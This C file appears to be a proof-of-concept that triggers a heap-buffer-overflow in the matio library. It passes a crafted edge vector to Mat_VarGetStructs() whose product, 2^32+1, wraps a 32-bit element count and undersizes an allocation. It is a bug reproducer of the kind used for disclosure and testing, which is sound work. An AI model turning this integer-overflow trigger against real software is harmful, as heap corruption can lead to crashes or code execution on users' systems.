/*
 * Proof-of-concept for a heap-buffer-overflow reachable through matio's
 * public API: Mat_VarCreateStruct() + Mat_VarGetStructs().
 *
 * Mat_VarGetStructs() slices a struct array given caller-supplied
 * start/stride/edge vectors. The element count for the output slab
 * (N * nfields) is validated for overflow by CheckEdgeOverflow() and then
 * used to size the destination allocation and to drive the fill loop that
 * populates it. A crafted edge[] whose product wraps a 32-bit int when
 * truncated causes the destination buffer to be undersized relative to the
 * number of elements the fill loop writes, corrupting the heap.
 */
#include <matio.h>
#include <stdio.h>
#include <stdlib.h>

int
main(void)
{
    const char *fieldnames[1] = {"a"};
    size_t dims[2] = {2, 1};
    int start[2] = {0, 0};
    int stride[2] = {1, 1};
    /* 641 * 6700417 == 2**32 + 1, chosen so that N * nfields wraps to a
     * small positive value when narrowed to a 32-bit int. */
    int edge[2] = {641, 6700417};
    matvar_t *matvar, *slab;

    matvar = Mat_VarCreateStruct("s", 2, dims, fieldnames, 1);
    if ( matvar == NULL ) {
        fprintf(stderr, "Mat_VarCreateStruct failed\n");
        return 1;
    }

    slab = Mat_VarGetStructs(matvar, start, stride, edge, 1);

    Mat_VarFree(slab);
    Mat_VarFree(matvar);
    return 0;
}
